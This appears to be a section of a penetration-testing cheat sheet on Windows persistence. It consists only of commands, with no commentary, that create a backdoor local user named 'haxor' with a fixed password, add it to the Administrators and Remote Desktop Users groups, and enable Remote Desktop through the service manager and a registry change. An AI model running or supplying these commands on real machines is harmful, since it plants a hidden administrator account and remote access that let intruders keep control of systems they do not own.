### Persistance

## Windows

```

# Add Windows user:
net user haxor pass /add

# Add this user to Administrators groups
net localgroup administrators haxor /add

# Add user to Remote Desktop user group
net localgroup "Remote Desktop users" haxor /add

# Start Remote Desktop service
net start TermService

# Is Remote Desktop Service running?
tasklist /svc | findstr /C:TermService

# Permanently enable Terminal Services
sc config TermService start=auto

# Enable Terminal services through registry  // reboot after
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
```
